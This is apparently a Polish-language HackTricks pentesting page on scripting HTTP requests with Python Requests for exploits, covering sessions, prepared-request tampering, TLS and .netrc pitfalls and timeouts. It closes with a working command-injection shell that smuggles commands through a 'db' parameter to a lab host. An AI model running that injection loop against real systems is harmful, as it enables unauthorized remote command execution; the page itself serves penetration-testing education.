# Żądania HTTP

{{#include ../../banners/hacktricks-training.md}}

## Python Requests

Te przykłady używają udokumentowanych argumentów żądań, właściwości odpowiedzi, krotek plików multipart oraz sesji biblioteki Requests.<sup>[[1]](#references)</sup> Przykłady z `verify=False` wyłączają weryfikację certyfikatu TLS i powinny być ograniczone do kontrolowanych testów.<sup>[[1]](#references)</sup>
```python
import random
import re
import string

import requests

url = "http://example.com:80/some/path.php"
params = {"p1":"value1", "p2":"value2"}
headers = {"User-Agent": "fake User Agent", "Fake header": "True value"}
cookies = {"PHPSESSID": "1234567890abcdef", "FakeCookie123": "456"}
proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

#Regular Get requests sending parameters (params)
gr = requests.get(url, params=params, headers=headers, cookies=cookies, verify=False, allow_redirects=True)

code = gr.status_code
ret_headers = gr.headers
body_byte = gr.content
body_text = gr.text
ret_cookies = gr.cookies
is_redirect = gr.is_redirect
is_permanent_redirect = gr.is_permanent_redirect
float_seconds = gr.elapsed.total_seconds()

#Regular Post requests sending parameters (data)
pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)

#Json Post requests sending parameters(json)
pr = requests.post(url, json=params, headers=headers, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)

#Post request sending a file(files) and extra values
filedict = {"<FILE_PARAMETER_NAME>" : ("filename.png", open("filename.png", 'rb').read(), "image/png")}
pr = requests.post(url, data={"submit": "submit"}, files=filedict)

#Useful for presenting results in boolean/time based injections
print(f"\rflag: {flag}{char}", end="")




##### Example Functions
target = "http://10.10.10.10:8000"
proxies = {}
s = requests.Session()

def register(username, password):
resp = s.post(target + "/register", data={"username":username, "password":password, "submit": "Register"}, proxies=proxies, verify=0)
return resp

def login(username, password):
resp = s.post(target + "/login", data={"username":username, "password":password, "submit": "Login"}, proxies=proxies, verify=0)
return resp

def get_info(name):
resp = s.post(target + "/projects", data={"name":name, }, proxies=proxies, verify=0)
guid = re.match('<a href="\/info\/([^"]*)">' + name + '</a>', resp.text)[1]
return guid

def upload(guid, filename, data):
resp = s.post(target + "/upload/" + guid, data={"submit": "upload"}, files={"file":(filename, data)}, proxies=proxies, verify=0)
guid = re.match('"' + filename + '": "([^"]*)"', resp.text)[1]
return guid

def json_search(guid, search_string):
resp = s.post(target + "/api/search/" + guid + "/", json={"search":search_string}, headers={"Content-Type": "application/json"}, proxies=proxies, verify=0)
return resp.json()

def get_random_string(guid, path):
return ''.join(random.choice(string.ascii_letters) for i in range(10))
```
## Przygotowane żądania do kontroli payloadu

`PreparedRequest` udostępnia końcowy adres URL, nagłówki i zakodowane body przed wysłaniem. Zbuduj go za pomocą `Session.prepare_request()` (zamiast `Request.prepare()`), gdy muszą zostać zastosowane cookies sesji lub uwierzytelnianie; gdy przygotowany przepływ musi również uwzględniać ustawienia proxy/CA ze środowiska, jawnie połącz je za pomocą `merge_environment_settings()`.<sup>[[1]](#references)</sup>
```python
s = requests.Session()
req = requests.Request("POST", url, data=b"role=user")
prepped = s.prepare_request(req)
prepped.body = b"role=admin%26debug%3D1"
prepped.headers["Content-Length"] = str(len(prepped.body))

env = s.merge_environment_settings(prepped.url, {}, None, None, None)
r = s.send(prepped, timeout=(3.05, 15), allow_redirects=False, **env)
print(r.request.headers)
print(r.request.body)
```
Jest to przydatne, gdy exploit wymaga niestandardowego kodowania lub podczas porównywania payloadu skonstruowanego z requestem zapisanym w `response.request`. Nie jest to primitive raw-HTTP: Requests przechowuje nagłówki w mapowaniu niewrażliwym na wielkość liter, więc przypisanie zduplikowanej nazwy zastępuje poprzednią wartość. Użyj sendera niższego poziomu w przypadku nieprawidłowych linii requestu lub odrębnych zduplikowanych pól `Content-Length`/`Transfer-Encoding`, wymaganych przez [HTTP request-smuggling tests](../../pentesting-web/http-request-smuggling/README.md).<sup>[[1]](#references)</sup>

## Izolacja sesji, niejawne dane uwierzytelniające i stan TLS

Sesja domyślnie ufa konfiguracji środowiska. Jeśli nie podano jawnego uwierzytelniania, Requests może pobrać dane uwierzytelniające Basic z `.netrc`; może również zaimportować konfigurację proxy oraz ścieżki do CA bundle ze zmiennych środowiskowych. W przypadku skryptów pobierających URL-e kontrolowane przez atakującego wyłącz te niejawne źródła i jawnie skonfiguruj wyłącznie przeznaczone proxy/CA dla labu. Wydania starsze niż 2.32.4 mogły wybrać dane uwierzytelniające z `.netrc` dla niewłaściwego hosta po otrzymaniu złośliwie spreparowanego URL-a, a `Session.trust_env = False` jest udokumentowanym obejściem, gdy aktualizacja nie jest możliwa.<sup>[[1]](#references)[[4]](#references)</sup>
```python
s = requests.Session()
s.trust_env = False
s.verify = "/path/to/lab-ca.pem"  # Prefer a lab CA over verify=False
s.proxies = {
"http": "http://127.0.0.1:8080",
"https": "http://127.0.0.1:8080",
}
```
Utrzymuj sesję, która używa `verify=False`, oddzielnie od sesji wymagających zweryfikowanego TLS. W Requests przed wersją 2.32.0 połączenie otwarte najpierw z `verify=False` mogło zostać ponownie użyte dla późniejszych żądań do tego samego originu, nawet gdy te żądania określały `verify=True`; aktualizacja naprawia ten problem ze stanem puli, ale izolacja ułatwia także audytowanie skryptów exploitów.<sup>[[5]](#references)</sup>

## Niezawodne pętle exploitów

Requests nie ma domyślnego limitu czasu. Limit czasu `(connect, read)` nie jest całkowitym terminem typu wall-clock: komponent `read` ogranicza czas oczekiwania klienta między odebranymi bajtami. Wyłącz automatyczne przekierowania, gdy target kontroluje `Location`, a następnie zweryfikuj każdy hop przed wysłaniem nowego żądania; jeśli przekierowania są włączone, sprawdź `response.history`. W przypadku dużych lub złośliwych odpowiedzi użyj `stream=True`, iteruj po ograniczonych fragmentach i zamknij odpowiedź za pomocą context managera, aby zwolnić połączenie z puli.<sup>[[1]](#references)</sup>
```python
limit = 2 * 1024 * 1024
body = bytearray()

with s.get(url, timeout=(3.05, 10), allow_redirects=False, stream=True) as r:
print(r.status_code, r.headers.get("Location"))
for chunk in r.iter_content(64 * 1024):
if len(body) + len(chunk) > limit:
raise ValueError("response exceeds limit")
body.extend(chunk)
```
## Python cmd do wykorzystania RCE

Pętla poleceń dziedziczy po `Cmd` z Python; jej metoda `default` obsługuje nierozpoznane prefiksy poleceń, `cmdloop` rozdziela wiersze wejściowe, a `re.DOTALL` pozwala wzorcowi ekstrakcji obejmować znaki nowej linii.<sup>[[2]](#references)[[3]](#references)</sup>
```python
import requests
import re
from cmd import Cmd

class Terminal(Cmd):
prompt = "Inject => "

def default(self, args):
output = RunCmd(args)
print(output)

def RunCmd(cmd):
data = { 'db': f'lol; echo -n "MYREGEXP"; {cmd}; echo -n "MYREGEXP2"' }
r = requests.post('http://10.10.10.127/select', data=data)
page = r.text
m = re.search('MYREGEXP(.*?)MYREGEXP2', page, re.DOTALL)
if m:
return m.group(1)
else:
return 1


term = Terminal()
term.cmdloop()
```
## References

- [1] [Interfejs deweloperski Requests](https://requests.readthedocs.io/en/stable/api/)
- [2] [Python `cmd` — Obsługa interpreterów poleceń zorientowanych na wiersze](https://docs.python.org/3/library/cmd.html)
- [3] [Python `re` — Operacje na wyrażeniach regularnych](https://docs.python.org/3/library/re.html)
- [4] [Requests podatne na leak poświadczeń `.netrc` za pośrednictwem złośliwych URL-i](https://github.com/psf/requests/security/advisories/GHSA-9hjg-9r4m-mvj7)
- [5] [Obiekt `Session` Requests nie weryfikuje żądań po wykonaniu pierwszego żądania z `verify=False`](https://github.com/psf/requests/security/advisories/GHSA-9wx4-h78v-vm56)
{{#include ../../banners/hacktricks-training.md}}
